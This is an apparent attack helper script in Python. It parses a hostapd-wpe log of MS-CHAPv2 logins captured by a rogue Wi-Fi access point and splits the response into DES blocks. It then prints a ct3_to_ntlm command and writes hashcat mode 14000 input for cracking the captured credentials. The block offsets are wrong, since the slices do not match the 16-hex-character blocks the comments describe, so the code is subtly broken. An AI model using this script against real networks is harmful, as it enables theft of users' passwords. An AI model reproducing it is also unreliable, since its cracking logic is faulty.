import re

def parse_hostapd_wpe_log(file_path):
    """
    Parses the hostapd-wpe log file to extract MS-CHAPv2 credentials.
    """
    with open(file_path, "r") as file:
        content = file.read()

    # Extract challenge (convert colon-separated hex to normal hex format)
    challenge_match = re.search(r"challenge:\s*([0-9a-fA-F:]+)", content)
    challenge = challenge_match.group(1).replace(":", "").strip() if challenge_match else None

    # Extract response (convert colon-separated hex to normal hex format)
    response_match = re.search(r"response:\s*([0-9a-fA-F:]+)", content)
    response = response_match.group(1).replace(":", "").strip() if response_match else None

    if not challenge or not response or len(response) != 48:
        raise ValueError("Invalid MS-CHAPv2 challenge/response format.")

    return challenge, response

def extract_des_blocks(response):
    """
    Extracts three 8-byte DES encrypted blocks from the 24-byte response.
    """
    
    enc1 = response[0:14]   # First 8-byte block (16 hex chars)
    enc2 = response[14:28] # Second 8-byte block (16 hex chars)
    enc3 = response[28:32]   # Third 8-byte block (16 hex chars)
    return [enc1, enc2, enc3]

if __name__ == "__main__":
    file_path = "hostapd-wpe.log"  # Change this to your log file path

    try:
        # Extract challenge and response
        challenge, response = parse_hostapd_wpe_log(file_path)

        print(f"Extracted Challenge: {challenge}")
        print(f"Extracted Response: {response}")

        # Extract all three DES-encrypted blocks
        encrypted_blocks = extract_des_blocks(response)

        print("/usr/share/hashcat-utils/ct3_to_ntlm.bin " + encrypted_blocks[-1] + " " + challenge)
        # print(k3)

        # Generate Hashcat mode 14000 format for each DES-encrypted block
        hashcat_entries = [f"{challenge}:{block}" for block in encrypted_blocks]

        print("\nHashcat Input Format (mode 14000):")
        for entry in hashcat_entries:
            print(entry)

        # Save to file for Hashcat input
        with open("hashcat_14000.txt", "w") as f:
            f.write("\n".join(hashcat_entries) + "\n")

        print("\nSaved to hashcat_14000.txt. Use this with hashcat mode 14000.")

    except Exception as e:
        print("Error:", str(e))

